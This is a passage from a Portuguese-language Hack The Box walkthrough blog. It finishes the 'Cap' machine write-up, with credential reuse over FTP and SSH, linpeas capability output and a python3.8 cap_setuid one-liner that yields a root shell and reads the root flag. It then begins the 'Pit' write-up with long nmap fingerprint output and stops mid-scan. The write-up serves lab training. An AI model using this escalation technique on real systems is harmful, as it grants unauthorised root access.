<span class="nt">-rw-r--r--</span>    1 1001     1001          220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span>    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23 19:17 .cache
<span class="nt">-rw-r--r--</span>    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -&gt; /dev/null
<span class="nt">-r--------</span>    1 1001     1001           33 Aug 11 16:25 user.txt
226 Directory send OK.
ftp&gt; get user.txt
<span class="nb">local</span>: user.txt remote: user.txt
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>user.txt <span class="o">(</span>33 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
33 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>358.0729 kB/s<span class="o">)</span>
ftp&gt; <span class="nb">exit
</span>221 Goodbye.

<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Após ler a flag de usuário, fiz uma tentativa com as mesmas credenciais via SSH e tive o sucesso esperado, onde pbtive um acesso interativo na máquina.</p>

<p>A primeira ação sempre executada como sempre é <code class="language-plaintext highlighter-rouge">sudo -l</code> mas, para a conta do usuário <code class="language-plaintext highlighter-rouge">nathan</code> nada foi retornado. Seguindo com a enumeração manual, decidi checar se tinhamos acesso ao diretório da aplicação, que está localizado no caminho padrão do apache (<code class="language-plaintext highlighter-rouge">/var/www/html</code>) e de que se trata de uma aplicação web baseada em Python a partir do arquivo <code class="language-plaintext highlighter-rouge">app.py</code>, par ao qual o usuário <code class="language-plaintext highlighter-rouge">nathan</code> tem acesso de gravação.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwxr-xr-x 6 nathan nathan 4096 May 25 07:25 <span class="nb">.</span>
drwxr-xr-x 3 root   root   4096 May 23 19:17 ..
drwxr-xr-x 2 nathan nathan 4096 May 27 09:10 __pycache__
<span class="nt">-rw-r--r--</span> 1 nathan nathan 4293 May 25 07:25 app.py
drwxr-xr-x 6 root   root   4096 May 23 19:17 static
drwxr-xr-x 2 root   root   4096 May 23 19:17 templates
drwxr-xr-x 2 root   root   4096 May 31 16:17 upload
</code></pre></div></div>

<p>Ao avaliar o conteúdo do arquivo, uma das funções executa o arquivo <code class="language-plaintext highlighter-rouge">tcpdump</code>, que normalmente requer privilégios de <code class="language-plaintext highlighter-rouge">root</code>. Esta permissão poderia ser abusada e utilizá-la para obter um shell reverso a partir de uma conta privilegiada.</p>

<p>Para testar isso, criei uma outra rota no app, com um caminho customizado mas, para ser efetivo, precisaria reiniciar o website em python, o que não é feito automaticamente e não tenho privilégios suficientes para tal tarefa.</p>

<p>Olhando mais a fundo, decidi executar o <code class="language-plaintext highlighter-rouge">linpeas.sh</code> e encontrei uma configuração que poderia nos auxiliar com a escalação de privilégio: alguns <strong>arquivos contém alguns capabilities não comuns</strong>, que foram validados em um segundo momento no GTFOBins:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
</code></pre></div></div>

<p>Dos arquivos listados o mais promissor é o <code class="language-plaintext highlighter-rouge">/usr/bin/python3.8</code> que possui o capability <code class="language-plaintext highlighter-rouge">cap_setuid</code> configurado, que, de acordo com o <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">python | GTFOBins</a> poderia nos permitir iniciar uma nova instancia do <code class="language-plaintext highlighter-rouge">/bin/sh</code> e, a partir desta, ler o conteúdo do arquivo flag do usuário <code class="language-plaintext highlighter-rouge">root</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:~<span class="nv">$ </span>/usr/bin/python3.8 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/sh")'</span>
<span class="c"># id &amp;&amp; hostname &amp;&amp; cat /root/root.txt</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
cap
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Cap, outra máquina Linux classificada como fácil do Hack The Box, criada por InfoSecJack.]]></summary></entry><entry><title type="html">Walktrough: HTB Pit</title><link href="https://davicruz.com/walkthrough/2021/09/htb-pit" rel="alternate" type="text/html" title="Walktrough: HTB Pit" /><published>2021-09-25T09:00:00-03:00</published><updated>2021-09-25T09:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/09/htb-pit</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/09/htb-pit"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Pit</strong>, outra máquina Linux classificada como mediana <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/159204">polarbearer</a> e <a href="https://app.hackthebox.eu/users/125033">GibParadox</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/pFwxqgv.png" alt="HTB Pit" class="align-center" /></p>

<p>Esta máquina foi diferente das demais pois demandou enumeração UDP, não frequentemente necessário porém sempre útil quando não tem muita saída:smile:. SNMP foi chave para enumerar e escalar privilégios nesta máquina, que tinha uma complexidade maior uma vez que possuía SELinux habilitado e não permitiu um shell interativo, até que conseguíssemos credenciais válidas do sistema, conectar via SSH e escalar privilégios.</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciado com um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code> a fim de validar os serviços atualmente publicados</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.241
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.                                 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 12:15 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.241
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page <span class="k">for </span>the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;
|     request
|     &lt;/title&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
|     &lt;style&gt;
|     body <span class="o">{</span>
|     margin: 0<span class="p">;</span>
|     font-family: <span class="s2">"RedHatDisplay"</span>, <span class="s2">"Open Sans"</span>, Helvetica, Arial, sans-serif<span class="p">;</span>
|     font-size: 12px<span class="p">;</span>
|     line-height: 1.66666667<span class="p">;</span>
|     color: <span class="c">#333333;</span>
|     background-color: <span class="c">#f5f5f5;</span>
|     border: 0<span class="p">;</span>
|     vertical-align: middle<span class="p">;</span>
|     font-weight: 300<span class="p">;</span>
|_    margin: 0 0 10p
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V<span class="o">=</span>7.91%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>8/10%Time<span class="o">=</span>61129849%P<span class="o">=</span>x86_64-pc-linux-gn
SF:u%r<span class="o">(</span>GetRequest,E70,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">Content-Type:
SF:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf8</span><span class="se">\r\n</span><span class="s2">Transfer-Encoding:</span><span class="se">\x</span><span class="s2">20chunked</span><span class="se">\r\n</span><span class="s2">X-DN
SF:S-Prefetch-Control:</span><span class="se">\x</span><span class="s2">20off</span><span class="se">\r\n</span><span class="s2">Referrer-Policy:</span><span class="se">\x</span><span class="s2">20no-referrer</span><span class="se">\r\n</span><span class="s2">X-Cont
SF:ent-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Cross-Origin-Resource-Policy:</span><span class="se">\x</span><span class="s2">20same-o
SF:rigin</span><span class="se">\r\n\r\n</span><span class="s2">29</span><span class="se">\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:&lt;title&gt;</span><span class="se">\r\n</span><span class="s2">b</span><span class="se">\r\n</span><span class="s2">Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">d08</span><span class="se">\r\n</span><span class="s2">&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;met
SF:a</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">text/html;</span><span class="se">\x</span><span class="s2">20charset=utf
SF:-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=de
SF:vice-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;style&gt;</span><span class="se">\n\t</span><span class="s2">body</span><span class="se">\x</span><span class="s2">
SF:20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20margin:</span><span class="se">\x</span><span class="s2">200;</span><span class="se">\n\x</span><span class="s2">2
SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-family:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">RedHatDi
SF:splay</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">Open</span><span class="se">\x</span><span class="s2">20Sans</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20Helvetica,</span><span class="se">\x</span><span class="s2">20Arial,</span><span class="se">\x</span><span class="s2">20sans-serif;</span><span class="se">\n\</span><span class="s2">
SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-size:</span><span class="se">\x</span><span class="s2">2012px;</span><span class="se">\n\x</span><span class="s2">2
SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20line-height:</span><span class="se">\x</span><span class="s2">201</span><span class="se">\.</span><span class="s2">6666666
SF:7;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20color:</span><span class="se">\x</span><span class="s2">20#333333;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20background-color:</span><span class="se">\x</span><span class="s2">20#
SF:f5f5f5;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0</span><span class="se">\x</span><span class="s2">20img</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20border:</span><span class="se">\</span><span class="s2">
SF:x200;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20vertical-align:</span><span class="se">\</span><span class="s2">
SF:x20middle;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20h1</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-w
SF:eight:</span><span class="se">\x</span><span class="s2">20300;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20p</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20mar
SF:gin:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">2010p"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,E70,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20r
SF:equest</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf8</span><span class="se">\r\n</span><span class="s2">Transfer-Encod
SF:ing:</span><span class="se">\x</span><span class="s2">20chunked</span><span class="se">\r\n</span><span class="s2">X-DNS-Prefetch-Control:</span><span class="se">\x</span><span class="s2">20off</span><span class="se">\r\n</span><span class="s2">Referrer-Policy:</span><span class="se">\x</span><span class="s2">
SF:20no-referrer</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Cross-Origin-Res
SF:ource-Policy:</span><span class="se">\x</span><span class="s2">20same-origin</span><span class="se">\r\n\r\n</span><span class="s2">29</span><span class="se">\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;
SF:head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;</span><span class="se">\r\n</span><span class="s2">b</span><span class="se">\r\n</span><span class="s2">Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">d08</span><span class="se">\r\n</span><span class="s2">&lt;/title
SF:&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">te
SF:xt/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\</span><span class="s2">
SF:"</span><span class="se">\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initial-scale<span class="o">=</span>1<span class="se">\.</span>0<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>
SF:20<span class="se">\x</span>20&lt;style&gt;<span class="se">\n\t</span>body<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
SF:0<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20fon
SF:t-family:<span class="se">\x</span>20<span class="se">\"</span>RedHatDisplay<span class="se">\"</span>,<span class="se">\x</span>20<span class="se">\"</span>Open<span class="se">\x</span>20Sans<span class="se">\"</span>,<span class="se">\x</span>20Helvetica,<span class="se">\x</span>20A
SF:rial,<span class="se">\x</span>20sans-serif<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20f
SF:ont-size:<span class="se">\x</span>2012px<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20lin
SF:e-height:<span class="se">\x</span>201<span class="se">\.</span>66666667<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
SF:<span class="se">\x</span>20color:<span class="se">\x</span>20#333333<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
SF:0background-color:<span class="se">\x</span>20#f5f5f5<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="o">}</span><span class="se">\n\x</span>20
SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20img<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20border:<span class="se">\x</span>200<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
SF:x20<span class="se">\x</span>20vertical-align:<span class="se">\x</span>20middle<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="o">}</span><span class="se">\n\</span>
SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20h1<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
SF:0<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20font-weight:<span class="se">\x</span>20300<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
